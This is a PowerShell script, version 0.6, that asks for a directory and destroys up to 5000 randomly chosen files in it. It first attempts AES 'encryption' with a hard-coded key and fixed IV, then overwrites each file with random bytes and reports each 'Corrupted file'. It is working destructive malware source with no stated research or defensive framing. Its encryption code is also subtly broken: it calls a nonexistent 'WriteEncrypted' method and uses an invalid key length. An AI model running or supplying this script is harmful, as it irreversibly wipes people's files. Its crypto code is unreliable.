# v0.6 12/24
# Timur Gabaidulin - timur.gab@gmail.com (C) 2024

$targetDirectory = Read-Host "Enter the target directory path"

if (-not (Test-Path -Path $targetDirectory -PathType Container)) {
    Write-Host "Invalid directory path!"
    Exit
}

$numFilesToCorrupt = 5000
$fileSize = 1024000
$chunkSize = 1024  # Writing smaller chunks to avoid memory issues

# Generate random data
function Generate-RandomData {
    param($size)

    $randomData = [byte[]]::new($size)
    [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomData)
    return $randomData
}

# Encrypt the file using AES encryption
function Encrypt-File {
    param (
        [string]$filePath,
        [string]$encryptionKey
    )
    
    $fileContent = Get-Content -Path $filePath -Raw
    
    # Create AES object
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes('1234567890123456')  # Use proper IV in production
    $encryptor = $aes.CreateEncryptor()
    
    # Encrypt the file content
    $encryptedContent = [System.Security.Cryptography.CryptoStream]::WriteEncrypted($fileContent, $encryptor)
    
    # Write encrypted content back to file
    [System.IO.File]::WriteAllBytes($filePath, $encryptedContent)
}

# Generate encryption key
$encryptionKey = "XU2nUUUfhj441HmPlL223j1vHnnI28f5yj58fj7943jlllm" #Replace with your own key for better security

# Get a list of files to corrupt in target directory
$files = Get-ChildItem -Path $targetDirectory -File | Get-Random -Count $numFilesToCorrupt

foreach ($file in $files) {
    $filePath = $file.FullName

    try {
        # Encrypt the file first to obscure original content
        Encrypt-File -filePath $filePath -encryptionKey $encryptionKey
        
        # Open the file stream for writing pseudo data
        $fileStream = [System.IO.File]::Open($filePath, [System.IO.FileMode]::Create)
        try {
            # Write pseudo data in chunks
            $remainingSize = $fileSize
            while ($remainingSize -gt 0) {
                $currentChunkSize = [math]::Min($chunkSize, $remainingSize)
                $randomData = Generate-RandomData -size $currentChunkSize
                $fileStream.Write($randomData, 0, $randomData.Length)
                $remainingSize -= $currentChunkSize
            }
            Write-Host "Corrupted file: $filePath"
        }
        finally {
            $fileStream.Close()
        }
    }
    catch {
        Write-Host "Failed to corrupt file: $filePath - $_"
    }
}
